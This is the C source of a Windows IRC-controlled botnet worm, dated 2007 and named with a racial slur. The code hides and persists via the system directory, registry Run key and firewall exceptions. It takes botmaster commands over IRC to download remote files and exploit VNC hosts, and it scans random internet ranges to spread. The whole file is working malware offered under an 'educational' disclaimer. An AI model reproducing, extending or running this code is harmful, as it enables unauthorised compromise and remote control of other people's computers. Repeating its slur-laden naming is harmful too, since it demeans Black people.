/*
 *      niggerbot.c 2007 Ravo_5002
 *      This code is for educational purposes only...
 */


#include <stdio.h>
#include <winsock.h>
#include <windows.h>

#include "niggerbot.h"
#include "ftpd.h"
#include "vncexploit.h"
#include "download.h"
#include "config.h"




volatile char *LOL = "GREETZ TO #BOTTALK ON BLUEHELL... YOURE ALL LAMERS THERE! CALL THIS VIRII W32.BOTTALKSUX";


/* main code */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    char myfilename[512];
	char sysdir[512];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), myfilename, sizeof(myfilename));

	if(strstr(myfilename, sysdir) == NULL) {
		char tmpfilename[512];
		sprintf(tmpfilename, "%s\\%s", sysdir, BOTNAME);
		CopyFile(myfilename, tmpfilename, FALSE);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
		
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		if (CreateProcess(tmpfilename, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			ExitProcess(EXIT_SUCCESS);
		}
	}
	if(!(strstr(GetCommandLine(), "Ravo5002"))) {
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		if (CreateProcess(myfilename, "Ravo5002", NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			ExitProcess(EXIT_SUCCESS);
		}
	}
	
	// bot was in system dir and started with the Ravo5002 commandline option
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, MUTEX), 3000) == WAIT_TIMEOUT) {
		ExitProcess(EXIT_FAILURE);
	}

	char *fwkey ="SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List";
	//char fwkey[256];
	//rot13(fwkey, "FLFGRZ\\PheeragPbagebyFrg\\Freivprf\\FunerqNpprff\\Cnenzrgref\\SverjnyyCbyvpl\\FgnaqneqCebsvyr\\NhgubevmrqNccyvpngvbaf\\Yvfg");
	// add bot to firewall
	HKEY hkey;
	char pfad[512];
	sprintf(pfad, "%s:*:Enabled:%s", myfilename, REGNAME);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, fwkey, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
	RegSetValueEx(hkey, myfilename, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
	RegCloseKey(hkey);
	
	char *runkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	//char runkey[256];
	//rot13(runkey, "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
	// add bot to registry startup
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE , runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, REGNAME, 0, REG_SZ, (const unsigned char *)myfilename, strlen(myfilename));
	RegCloseKey(key);

	WSADATA wsaData;
    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
        exit(1);
    }
	
	SOCKET ircconn;
	ircconn = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	if(ircconn == INVALID_SOCKET) {
		return 0;
	}
	HANDLE threads[THREADS];
	threads[0] = CreateThread(NULL,0, irc, (void *)ircconn, 0, 0);
	threads[1] = CreateThread(NULL,0, ftpd, (void *)ircconn, 0, 0);	
	int i;
	for(i = 2; i < THREADS; i++) {
		threads[i] = CreateThread(NULL,0, rangescan, (void *)ircconn, 0, 0);
		sleep(500);
	}
	WaitForMultipleObjects( THREADS, threads, TRUE, INFINITE);
	for(i = 0; i < THREADS; i++) {
		CloseHandle(threads[i]);
	}
	WSACleanup();
	return 0;
}

char *randnick(void) {
	// shamelessly ripped from kaiten...
	srand(GetTickCount()+rand());
	char *tmp;
	int len=(rand()%5)+4,i;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	return tmp;
}

void privmsg_irc(SOCKET ircconn, char *params) {


	char *cmd = strtok(params, " ");
	char *options = strtok(NULL, "\n");
	options = strtok(options, "\n");
	
	char buff[4096];
	if(strstr(cmd, "!quit")) {
		sprintf(buff, "QUIT :Latazz...\n");
		send(ircconn,buff, strlen(buff), 0);
		closesocket(ircconn);
		exit(0);
	}
	else if(strstr(cmd, "!irc")) {
		sprintf(buff, "%s\n", options);
		send(ircconn,buff, strlen(buff), 0);
		return;
	}
	else if(strstr(cmd, "!vnc")) {
		sprintf(buff, "PRIVMSG %s :Manually exploiting %s...\n", CHANNEL, options);
		send(ircconn,buff, strlen(buff), 0);
		vncscan(ircconn, options);
		return;
	}
	else if(strstr(cmd, "!download")) {
		sprintf(buff, "PRIVMSG %s :Downloading %s...\n", CHANNEL, options);
		send(ircconn,buff, strlen(buff), 0);
		download(ircconn, options);
		return;
	}
	else if(strstr(cmd, "!ip")) {
		sprintf(buff, "PRIVMSG %s :My ip is %s...\n", CHANNEL, getlocalip());
		send(ircconn,buff, strlen(buff), 0);
		return;
	}
	else if(strstr(cmd, "!version")) {
		sprintf(buff, "PRIVMSG %s :%s\n", CHANNEL, VERSION);
		send(ircconn,buff, strlen(buff), 0);
		return;
	}
	return;
}

unsigned long irc(void *s) {

	struct hostent *hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET ircconn = (SOCKET)s;
	char buff[4096];

	hp = gethostbyname(SERVER);

	server.sin_addr.s_addr=*((unsigned long*)hp->h_addr);
	server.sin_family=AF_INET;
	server.sin_port=htons(PORT);
	while(connect(ircconn,(struct sockaddr*)&server,sizeof(server))) {
		//printf("cant connect to ircd, lets wait...\n");
		sleep(2000);
	}

	char *nick = randnick();
	char *user = randnick();
	char *ident = randnick();

	sprintf(buff, "NICK %s\n", nick);
	send(ircconn,buff,strlen(buff),0);
	sprintf(buff, "USER %s \"%s\" \"localhost\" :%s\n", user, ident, nick);
	send(ircconn,buff,strlen(buff),0);	
	sprintf(buff, "JOIN %s\n", CHANNEL);
	send(ircconn,buff,strlen(buff),0);
	
	while(1) {
		memset(buff,0,sizeof(buff));
		recv(ircconn,buff,sizeof(buff),0);
		ircparse(ircconn, buff);
		//printf("%s\n", buff); // debug
		//Sleep(2000);
    }
	return 0;

}


void ircparse(SOCKET ircconn, char ircline[4096]) {
	
    char *first = strtok(ircline, " ");
	char *last = strtok(NULL, "\0");
	if (!first || !last) 
		return;
	
	
	// normal irc functions here
	if(strstr(first, "PING")) {
		sprintf(ircline, "PONG %s\n", last);
		send(ircconn,ircline,strlen(ircline),0);
		return;
	}
	
	// botmaster functions here
	char *command = strtok(last, " ");
	strtok(NULL, ":");
	char *parameters = strtok(NULL, "\0");
	
	if(strstr(first, BOTMASTER)) {
		if(strstr(command, "PRIVMSG") || strstr(command, "NOTICE")) {
			privmsg_irc(ircconn, parameters);
			return;
		}
		return;
	}
	
	// error irc functions here
	else if(strstr(command, "433")) {
		sprintf(ircline, "NICK %s\n", randnick());
		send(ircconn,ircline,strlen(ircline),0);
		sprintf(ircline, "JOIN %s\n", CHANNEL);
		send(ircconn,ircline,strlen(ircline),0);
		return;
	}
	else if(strstr(command, "451")) {
		char *nick = randnick();
		char *user = randnick();
		char *ident = randnick();
		sprintf(ircline, "NICK %s\n",  nick);
		send(ircconn,ircline,strlen(ircline),0);
		sprintf(ircline, "USER %s \"%s\" \"localhost\" :%s\n", user, ident, nick);
		send(ircconn,ircline,strlen(ircline),0);	
		sprintf(ircline, "JOIN %s\n", CHANNEL);
		send(ircconn,ircline,strlen(ircline),0);
	}
	
	return;
}

unsigned long rangescan(void *s) {

	SOCKET ircconn = (SOCKET)s;
	
	// get first two octets of local ip adress.
	char myhostname[80];
	int a, b, c, d;
	gethostname(myhostname, sizeof(myhostname));
	struct hostent *phe = gethostbyname(myhostname);
	struct in_addr addr;
	memcpy(&addr, phe->h_addr_list[0], sizeof(struct in_addr));
	char *localip = inet_ntoa(addr);

	a = atoi(strtok(localip, "."));
	b = atoi(strtok(NULL, "."));
	

	
	if( 
		(a == 192 && b == 168) || 				// 192.168
		a == 10 ||  							// 10.
		(a == 172 && (b > 16 && b < 31)) || 	//172.16-172.31
		(a > 40 && a < 50) || 					// 40.-50. (gov ranges and network 44)
		(a == 169) ||							// 169. (error adress)
		a < 4 									// gov adresses
	   ) {
		int rangesize = rand()%4;				// 4 is the amount of ranges :)
		char *ranges[] = {						// ranges to scan when internal... these ranges wont be exploited, but only shown in channel
			"220", "116",
			"200", "161",
			"200", "162",
			"200", "0"
		};
		a = atoi(ranges[rangesize*2]);
		b = atoi(ranges[rangesize*2+1]);
	}
	srand(GetTickCount());
	char ip[32];
	while(1) {
		c = rand()%253+1;
		d = rand()%253+1;
		sprintf(ip, "%d.%d.%d.%d", a, b, c, d);
		vncscan(ircconn, ip);
	}
	return 0;
}


char *getlocalip(void) {
	char myhostname[80];
	gethostname(myhostname, sizeof(myhostname));
	struct hostent *phe = gethostbyname(myhostname);
	struct in_addr addr;
	memcpy(&addr, phe->h_addr_list[0], sizeof(struct in_addr));
	return inet_ntoa(addr);
}
